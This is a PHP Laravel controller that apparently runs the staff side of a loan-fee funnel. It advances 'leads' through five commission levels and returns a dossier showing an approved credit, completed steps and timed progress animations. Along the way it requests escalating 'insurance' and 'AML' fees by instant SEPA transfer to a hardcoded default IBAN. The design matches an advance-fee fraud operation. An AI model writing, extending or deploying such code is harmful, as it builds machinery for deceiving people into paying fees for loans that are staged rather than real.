<?php

namespace App\Http\Controllers\Api;

use App\Http\Controllers\Controller;
use App\Models\CommissionLevel;
use App\Models\IbanSetting;
use App\Models\User;
use App\Models\Chat;
use App\Support\FunnelProgress;
use App\Support\ManagerTrafficAssigner;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Cache;

class AdminCommissionController extends Controller
{
    public function advance(Request $request): JsonResponse
    {
        $validated = $request->validate([
            'level' => 'required|integer|min:1|max:5|exists:commission_levels,order',
            'email' => 'nullable|email',
            'user_id' => 'nullable|integer|min:1',
        ]);

        $user = null;

        if (!empty($validated['user_id'])) {
            $user = User::find($validated['user_id']);
        }

        if ($user === null) {
            if (!empty($validated['email'])) {
                $user = User::where('email', $validated['email'])->first();
            }
        }

        if ($user === null) {
            $user = $request->user();
        }

        if ($user === null) {
            return response()->json([
                'message' => 'User not found',
            ], 404);
        }

        $transitionLock = Cache::lock('lead_transition:' . (int) $user->id, 20);
        if (!$transitionLock->get()) {
            return response()->json(['message' => 'Лид сейчас переводится на другой этап. Повторите действие через несколько секунд.'], 409);
        }

        try {
        $level = (int) $validated['level'];
        if ($level < 1) {
            $level = 1;
        }
        if ($level > 5) {
            $level = 5;
        }

        $prevLevel = (int) ($user->commission_level_id ?? 1);
        if ($prevLevel !== $level) {
            $progress = FunnelProgress::resetForLevelChange(
                $user->wizard_progress,
                $prevLevel,
                $level,
            );
            $user->wizard_progress = json_encode($progress, JSON_UNESCAPED_UNICODE);
        }
        $user->commission_level_id = $level;
        $user->save();

        $chat = Chat::query()->where('user_id', $user->id)->first();
        ManagerTrafficAssigner::syncChatAssignment($user->fresh(), $chat);

        return response()->json($this->buildDossier($user, $level));
        } finally {
            try { $transitionLock->release(); } catch (\Throwable $e) {}
        }
    }

    private function buildDossier(User $user, int $level): array
    {
        $nameParts = preg_split('/\s+/', trim((string) $user->name), 2);
        $firstName = $nameParts[0] ?? '';
        $lastName = trim((string) ($user->surname ?? ($nameParts[1] ?? '')));

        $phase = 'ready';
        if ($level === 3) {
            $phase = 'policy_build';
        }

        $fees = [
            1 => ['amountCents' => 3700, 'reason' => 'base'],
            2 => ['amountCents' => 17200, 'reason' => 'insurance'],
            3 => ['amountCents' => 13600, 'reason' => 'aml'],
            4 => ['amountCents' => 0, 'reason' => 'release'],
            5 => ['amountCents' => 0, 'reason' => 'release'],
        ];

        $dbLevels = CommissionLevel::query()->get(['order', 'amount']);
        foreach ($dbLevels as $dbLevel) {
            $order = (int) ($dbLevel->order ?? 0);
            if (!array_key_exists($order, $fees)) {
                continue;
            }
            $fees[$order]['amountCents'] = (int) round(((float) $dbLevel->amount) * 100);
        }

        $fee = $fees[$level] ?? $fees[1];

        $ibanSettings = IbanSetting::query()->first();
        $levelCoords = \App\Models\IbanLevelSetting::resolveForLevel($level, $ibanSettings);

        $beneficiary = $levelCoords['beneficiary'] !== '' ? $levelCoords['beneficiary'] : 'Velora Servizi S.r.l.';
        $ibanRaw = $levelCoords['iban'] !== '' ? $levelCoords['iban'] : 'IT09T02008090050000043094427';
        $swift = $levelCoords['swift'] !== '' ? $levelCoords['swift'] : 'UNCRITMMXXX';

        $paymentCoords = [
            'method' => 'sepa_instant',
            'beneficiary' => $beneficiary,
            'iban' => $ibanRaw,
            'swift' => $swift,
            'amountCents' => (int) $fee['amountCents'],
            'texts' => [
                'lead' => trim((string) ($ibanSettings?->payment_lead_text ?? $ibanSettings?->sepa_explanation ?? '')),
                'method' => trim((string) ($ibanSettings?->payment_method_text ?? '')),
                'beneficiaryLabel' => trim((string) ($ibanSettings?->payment_beneficiary_label ?? '')),
                'ibanLabel' => trim((string) ($ibanSettings?->payment_iban_label ?? '')),
                'swiftLabel' => trim((string) ($ibanSettings?->payment_swift_label ?? '')),
                'amountLabel' => trim((string) ($ibanSettings?->payment_amount_label ?? '')),
                'receiptText' => trim((string) ($ibanSettings?->payment_receipt_text ?? '')),
                'confirmText' => trim((string) ($ibanSettings?->payment_confirm_text ?? '')),
            ],
        ];

        $animations = [
            1 => 0,
            2 => 7 * 60 * 1000,
            3 => 0,
            4 => 3 * 60 * 1000,
        ];

        return [
            'client' => [
                'firstName' => $firstName,
                'lastName' => $lastName,
                'email' => $user->email,
            ],
            'credit' => [
                'approvedAmountCents' => (int) round($this->approvedAmountWithLevelBonus($user, (float) ($user->requested_amount ?? 0)) * 100),
                'ratePercent' => 3.8,
                'isNew' => false,
            ],
            'policy' => [
                'status' => $level >= 4 ? 'issued' : 'processing',
                'etaMinutes' => $level >= 4 ? 0 : 30,
            ],
            'transfer' => [
                'status' => 'idle',
                'etaMinutes' => 60,
                'method' => null,
                'accountTail' => '',
            ],
            'commission' => [
                'level' => $level,
                'phase' => $phase,
                'fee' => $fee,
                'animationMs' => $animations[$level],
                'animationStartedAt' => null,
                'policyProgress' => $level >= 4 ? 1 : ($level === 3 ? 0.05 : 0),
            ],
            'steps' => [
                ['id' => 'simulation', 'completed' => true],
                ['id' => 'approval', 'completed' => true],
                ['id' => 'account', 'completed' => true],
                ['id' => 'documents', 'completed' => true],
                ['id' => 'signature', 'completed' => true],
            ],
            'currentStep' => 'signature',
            'documents' => [
                ['kind' => 'identity', 'fileName' => '', 'uploadedAt' => null],
            ],
            'payment_coords' => $paymentCoords,
            'paymentCoords' => $paymentCoords,
        ];
    }

    private function approvedAmountWithLevelBonus(User $user, float $requestedOrBaseApproved, bool $isBaseApproved = false): float
    {
        $baseApproved = $isBaseApproved
            ? $requestedOrBaseApproved
            : $this->approvedFromRequested($requestedOrBaseApproved);

        $level = max(1, (int) ($user->commission_level_id ?? 1));
        $bonus = (float) (
            CommissionLevel::query()
                ->where('order', $level)
                ->value('approved_amount_bonus')
            ?? 0
        );

        return max(0, round($baseApproved + max(0, $bonus), 2));
    }

    private function approvedFromRequested(float $requested): float
    {
        if ($requested <= 0) {
            return 0.0;
        }

        $cutMin = 0.15;
        $cutMax = 0.20;
        $steps = (int) round($cutMax * 100 - $cutMin * 100) + 1;
        $cut = $cutMin + (abs((int) round($requested / 500)) % $steps) / 100;

        $reduced = $requested * (1 - $cut);

        return floor($reduced / 100) * 100;
    }

}
